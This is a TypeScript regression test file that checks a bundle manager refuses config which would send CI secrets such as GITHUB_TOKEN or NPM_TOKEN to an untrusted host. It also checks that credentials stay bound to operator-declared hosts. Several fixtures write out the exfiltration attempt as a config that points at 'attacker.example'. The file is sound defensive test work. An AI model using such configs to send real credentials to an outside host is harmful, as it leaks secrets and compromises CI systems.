/**
 * Regression tests for CIB-109 (deepsec finding `secret-env-var`,
 * run `20260629190245-caf2a4b60b2715fe`):
 * "Bundle auth can exfiltrate arbitrary environment variables".
 *
 * `BundleConfig.auth.password_env` / `token_env` come from
 * workspace-controlled bundle config. Without restriction, a malicious
 * `.anvil` config can point `token_env` at `GITHUB_TOKEN` and `url` at an
 * attacker host, exfiltrating an unrelated CI secret in the Authorization
 * header. Credential env names must be restricted to the `ANVIL_BUNDLE_`
 * prefix or the operator-owned `ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST`, and a
 * credential may be bound to its intended host via the operator-owned
 * `<NAME>_HOST` sibling variable.
 *
 * NOTE: URLs use the literal `127.0.0.1` rather than `localhost` so the
 * loopback address matches the server bind address — `localhost` can resolve
 * to `::1` (IPv6) while the test servers listen on `127.0.0.1` (IPv4).
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { BundleManager, type BundleConfig } from './bundle-manager.js';
import { mkdtempSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { createServer, type Server, type IncomingMessage, type ServerResponse } from 'node:http';
import { safeCleanup } from '../../../../tools/test-utils/safe-cleanup.js';

function listen(server: Server): Promise<number> {
  return new Promise((resolve, reject) => {
    server.listen(0, '127.0.0.1', () => {
      const addr = server.address();
      if (addr && typeof addr !== 'string') resolve(addr.port);
      else reject(new Error('no port'));
    });
  });
}

function close(server: Server | null): Promise<void> {
  return new Promise((resolve) => {
    if (!server) return resolve();
    server.close(() => resolve());
    setTimeout(resolve, 1000);
  });
}

const SECRET = 'test-secret-value-1';

describe('BundleManager — auth env credential binding (CIB-109)', () => {
  let cacheDir: string;
  let manager: BundleManager;
  let server: Server | null = null;
  let port = 0;
  const captured: Array<{ path?: string; authorization?: string | string[] }> = [];

  const ENV_KEYS = [
    'GITHUB_TOKEN',
    'NPM_TOKEN',
    'ANVIL_BUNDLE_TEST_TOKEN',
    'ANVIL_BUNDLE_TEST_TOKEN_HOST',
    'ANVIL_BUNDLE_TEST_PASSWORD',
    'LEGACY_BUNDLE_TOKEN',
    'ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST',
  ] as const;

  beforeEach(async () => {
    cacheDir = mkdtempSync(join(tmpdir(), 'anvil-bundle-auth-env-test-'));
    manager = new BundleManager({ cacheDir, verifySignatures: false, timeoutMs: 5000 });
    captured.length = 0;
    for (const key of ENV_KEYS) delete process.env[key];

    // Capture server: records the Authorization header it sees. Responds with
    // a non-tarball body — assertions are on captured headers and returned
    // errors, not on extraction success.
    server = createServer((req: IncomingMessage, res: ServerResponse) => {
      captured.push({ path: req.url, authorization: req.headers['authorization'] });
      res.statusCode = 200;
      res.end('not-a-real-bundle');
    });
    port = await listen(server);
  });

  afterEach(async () => {
    for (const key of ENV_KEYS) delete process.env[key];
    await close(server);
    server = null;
    await safeCleanup(cacheDir);
  });

  describe('env-name restriction', () => {
    it('refuses a bearer token_env outside the trusted namespace (e.g. GITHUB_TOKEN)', () => {
      process.env.GITHUB_TOKEN = SECRET;
      expect(() =>
        manager.addBundle({
          name: 'evil',
          url: 'https://attacker.example/bundle.tar.gz',
          auth: { type: 'bearer', token_env: 'GITHUB_TOKEN' },
        })
      ).toThrow(/GITHUB_TOKEN.*not authorised|not authorised.*GITHUB_TOKEN/s);
    });

    it('refuses a basic password_env outside the trusted namespace', () => {
      process.env.NPM_TOKEN = SECRET;
      expect(() =>
        manager.addBundle({
          name: 'evil-basic',
          url: 'https://attacker.example/bundle.tar.gz',
          auth: { type: 'basic', username: 'ci', password_env: 'NPM_TOKEN' },
        })
      ).toThrow(/NPM_TOKEN/);
    });

    it('refuses untrusted names in the constructor bundle list', () => {
      expect(
        () =>
          new BundleManager({
            cacheDir,
            bundles: [
              {
                name: 'evil',
                url: 'https://attacker.example/bundle.tar.gz',
                auth: { type: 'bearer', token_env: 'GITHUB_TOKEN' },
              },
            ],
          })
      ).toThrow(/GITHUB_TOKEN/);
    });

    it('never echoes the secret value in the refusal error', () => {
      process.env.GITHUB_TOKEN = SECRET;
      let message = '';
      try {
        manager.addBundle({
          name: 'evil',
          url: 'https://attacker.example/bundle.tar.gz',
          auth: { type: 'bearer', token_env: 'GITHUB_TOKEN' },
        });
      } catch (error) {
        message = error instanceof Error ? error.message : String(error);
      }
      expect(message).not.toBe('');
      expect(message).not.toContain(SECRET);
      // Actionable: the error names the rule the operator must follow.
      expect(message).toMatch(/ANVIL_BUNDLE_/);
    });

    it('accepts and sends an ANVIL_BUNDLE_-prefixed bearer credential', async () => {
      process.env.ANVIL_BUNDLE_TEST_TOKEN = 'trusted-token';
      manager.addBundle({
        name: 'ok',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      await manager.downloadBundle('ok');
      expect(captured[0]?.authorization).toBe('Bearer trusted-token');
    });

    it('accepts and sends an ANVIL_BUNDLE_-prefixed basic credential', async () => {
      process.env.ANVIL_BUNDLE_TEST_PASSWORD = 'trusted-pass';
      manager.addBundle({
        name: 'ok-basic',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'basic', username: 'user', password_env: 'ANVIL_BUNDLE_TEST_PASSWORD' },
      });
      await manager.downloadBundle('ok-basic');
      const expected = `Basic ${Buffer.from('user:trusted-pass').toString('base64')}`;
      expect(captured[0]?.authorization).toBe(expected);
    });

    it('accepts a name explicitly allowlisted via operator-owned ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST', async () => {
      process.env.ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST = 'OTHER_NAME, LEGACY_BUNDLE_TOKEN';
      process.env.LEGACY_BUNDLE_TOKEN = 'legacy-token';
      manager.addBundle({
        name: 'legacy',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'LEGACY_BUNDLE_TOKEN' },
      });
      await manager.downloadBundle('legacy');
      expect(captured[0]?.authorization).toBe('Bearer legacy-token');
    });

    it('refuses the allowlist variable itself as a credential, despite the prefix', () => {
      // The allowlist value enumerates the operator's other trusted
      // credential names — reconnaissance data that must never be sent as a
      // Bearer token to a config-controlled URL. Self-allowlisting must not
      // help either.
      process.env.ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST =
        'ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST, LEGACY_BUNDLE_TOKEN';
      expect(() =>
        manager.addBundle({
          name: 'recon',
          url: `http://127.0.0.1:${port}/bundle.tar.gz`,
          auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST' },
        })
      ).toThrow(/not authorised/);
      // Config-time refusal: the config was never registered, and nothing
      // reached the wire at any point in this test.
      expect(manager.getBundleNames()).not.toContain('recon');
      expect(captured.length).toBe(0);
    });

    it('defence in depth: a malicious config injected past addBundle is still refused before any request', async () => {
      // Simulate a future config path that forgets to validate (or a
      // tampered in-memory state) by writing directly into the private
      // bundle map, bypassing addBundle/constructor validation. The
      // buildAuthHeader layer must still refuse before a request is made.
      process.env.ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST = 'ANVIL_BUNDLE_RECON_NAMES';
      const config: BundleConfig = {
        name: 'recon-injected',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST' },
      };
      (manager as unknown as { bundles: Map<string, BundleConfig> }).bundles.set(
        config.name,
        config
      );
      const result = await manager.downloadBundle('recon-injected');
      expect(result.success).toBe(false);
      expect(result.error ?? '').toMatch(/not authorised/);
      // The allowlist value never leaves the process.
      expect(result.error ?? '').not.toContain('ANVIL_BUNDLE_RECON_NAMES');
      expect(captured.length).toBe(0);
    });

    it('refuses credential names ending in the reserved _HOST binding suffix', () => {
      // A credential named ANVIL_BUNDLE_FOO_HOST would silently double as
      // the host binding for ANVIL_BUNDLE_FOO; the suffix is reserved.
      expect(() =>
        manager.addBundle({
          name: 'suffix-clash',
          url: `http://127.0.0.1:${port}/bundle.tar.gz`,
          auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_FOO_HOST' },
        })
      ).toThrow(/_HOST.*reserved|reserved.*_HOST/s);
      // Allowlisting does not lift the reservation.
      process.env.ANVIL_BUNDLE_AUTH_ENV_ALLOWLIST = 'MY_LEGACY_HOST';
      expect(() =>
        manager.addBundle({
          name: 'suffix-clash-allowlisted',
          url: `http://127.0.0.1:${port}/bundle.tar.gz`,
          auth: { type: 'basic', username: 'u', password_env: 'MY_LEGACY_HOST' },
        })
      ).toThrow(/_HOST/);
    });

    it('refuses whitespace-padded credential names with a clear error', () => {
      // A padded name would validate as one name but read a different
      // process.env key in buildAuthHeader; refuse rather than silently trim.
      process.env.ANVIL_BUNDLE_TEST_TOKEN = 'trusted-token';
      expect(() =>
        manager.addBundle({
          name: 'padded',
          url: `http://127.0.0.1:${port}/bundle.tar.gz`,
          auth: { type: 'bearer', token_env: ' ANVIL_BUNDLE_TEST_TOKEN ' },
        })
      ).toThrow(/whitespace/i);
    });

    it('still accepts auth configs that reference no env var at all', async () => {
      manager.addBundle({
        name: 'no-env',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'basic', username: 'user-only' },
      });
      await manager.downloadBundle('no-env');
      const expected = `Basic ${Buffer.from('user-only:').toString('base64')}`;
      expect(captured[0]?.authorization).toBe(expected);
    });
  });

  describe('host binding', () => {
    it('refuses to send a credential to a host other than its operator-declared binding', async () => {
      process.env.ANVIL_BUNDLE_TEST_TOKEN = SECRET;
      process.env.ANVIL_BUNDLE_TEST_TOKEN_HOST = 'bundles.corp.example';
      manager.addBundle({
        name: 'unbound',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      const result = await manager.downloadBundle('unbound');
      expect(result.success).toBe(false);
      expect(result.error ?? '').toMatch(/bound/i);
      expect(result.error ?? '').not.toContain(SECRET);
      // The credential must never have reached the wire.
      expect(captured.some((c) => c.authorization !== undefined)).toBe(false);
    });

    it('sends the credential when the request host matches the binding', async () => {
      process.env.ANVIL_BUNDLE_TEST_TOKEN = 'bound-token';
      process.env.ANVIL_BUNDLE_TEST_TOKEN_HOST = '127.0.0.1';
      manager.addBundle({
        name: 'bound',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      await manager.downloadBundle('bound');
      expect(captured[0]?.authorization).toBe('Bearer bound-token');
    });

    it('enforces the port when the binding declares one', async () => {
      process.env.ANVIL_BUNDLE_TEST_TOKEN = SECRET;
      process.env.ANVIL_BUNDLE_TEST_TOKEN_HOST = `127.0.0.1:${port + 1}`;
      manager.addBundle({
        name: 'wrong-port',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      const result = await manager.downloadBundle('wrong-port');
      expect(result.success).toBe(false);
      expect(captured.some((c) => c.authorization !== undefined)).toBe(false);
    });

    it('accepts an origin-style binding value with an explicit matching port', async () => {
      process.env.ANVIL_BUNDLE_TEST_TOKEN = 'bound-token';
      process.env.ANVIL_BUNDLE_TEST_TOKEN_HOST = `http://127.0.0.1:${port}`;
      manager.addBundle({
        name: 'origin-bound',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      await manager.downloadBundle('origin-bound');
      expect(captured[0]?.authorization).toBe('Bearer bound-token');
    });

    it('an https origin binding refuses the credential on http to the same host', async () => {
      // Same hostname and explicit matching port, but the binding pins the
      // https origin: a downgrade to http must not receive the credential.
      process.env.ANVIL_BUNDLE_TEST_TOKEN = SECRET;
      process.env.ANVIL_BUNDLE_TEST_TOKEN_HOST = `https://127.0.0.1:${port}`;
      manager.addBundle({
        name: 'proto-downgrade',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      const result = await manager.downloadBundle('proto-downgrade');
      expect(result.success).toBe(false);
      expect(result.error ?? '').toMatch(/bound/i);
      expect(result.error ?? '').not.toContain(SECRET);
      expect(captured.some((c) => c.authorization !== undefined)).toBe(false);
    });

    it('an origin binding without an explicit port enforces the protocol default port', async () => {
      // `http://127.0.0.1` implies port 80; a request to the same host on a
      // different port must not receive the credential.
      process.env.ANVIL_BUNDLE_TEST_TOKEN = SECRET;
      process.env.ANVIL_BUNDLE_TEST_TOKEN_HOST = 'http://127.0.0.1';
      manager.addBundle({
        name: 'implied-port',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      const result = await manager.downloadBundle('implied-port');
      expect(result.success).toBe(false);
      expect(result.error ?? '').toMatch(/bound/i);
      expect(captured.some((c) => c.authorization !== undefined)).toBe(false);
    });

    it('fails closed on an unparseable binding value', async () => {
      process.env.ANVIL_BUNDLE_TEST_TOKEN = SECRET;
      process.env.ANVIL_BUNDLE_TEST_TOKEN_HOST = 'not a host!!';
      manager.addBundle({
        name: 'bad-binding',
        url: `http://127.0.0.1:${port}/bundle.tar.gz`,
        auth: { type: 'bearer', token_env: 'ANVIL_BUNDLE_TEST_TOKEN' },
      });
      const result = await manager.downloadBundle('bad-binding');
      expect(result.success).toBe(false);
      expect(captured.some((c) => c.authorization !== undefined)).toBe(false);
    });
  });
});
